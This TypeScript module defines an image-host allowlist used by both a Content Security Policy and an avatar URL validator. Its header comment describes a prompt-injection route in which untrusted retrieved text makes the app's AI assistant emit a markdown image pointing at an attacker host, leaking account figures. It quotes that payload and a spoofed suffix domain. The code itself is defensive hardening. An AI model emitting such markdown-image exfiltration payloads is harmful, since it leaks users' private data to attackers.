// The hosts this app loads images from. ONE definition, consumed by both the
// CSP img-src directive (middleware.ts) and the profile avatar validator
// (app/api/profile/route.ts), because a validator that accepts more than the
// CSP allows produces avatars the API stores and the browser refuses to render.
//
// img-src used to be a bare `https:` wildcard. The assistant renders model
// output as markdown and that output can quote untrusted retrieved text, so an
// injected `![](https://attacker/?d=…)` was an egress path for whatever account
// figures the answer carried. Adding a host here re-opens that path for the
// host you add.
//
// Edge-safe: pure const module, no imports (middleware runs on the Edge runtime).
export const ALLOWED_IMAGE_HOSTS = [
  // Radon media CDN: newsfeed cards and uploaded avatars. Mirrors
  // next.config.mjs images.remotePatterns.
  "media.radon.run",
  // Clerk's image CDN, which serves user.imageUrl.
  "img.clerk.com",
] as const;

export const IMAGE_HOST_SOURCES = ALLOWED_IMAGE_HOSTS.map(
  (host) => `https://${host}`,
).join(" ");

/** True for an image URL the CSP will actually let the browser load. */
export function isAllowedImageUrl(raw: string): boolean {
  const trimmed = raw.trim();
  if (trimmed.length === 0) return false;
  // Inline images never leave the browser, so they are not an egress path.
  if (trimmed.startsWith("data:image/")) return true;

  let parsed: URL;
  try {
    parsed = new URL(trimmed);
  } catch {
    return false;
  }
  if (parsed.protocol !== "https:") return false;
  // Exact host match. A suffix test would accept media.radon.run.attacker.example.
  return (ALLOWED_IMAGE_HOSTS as readonly string[]).includes(parsed.hostname);
}
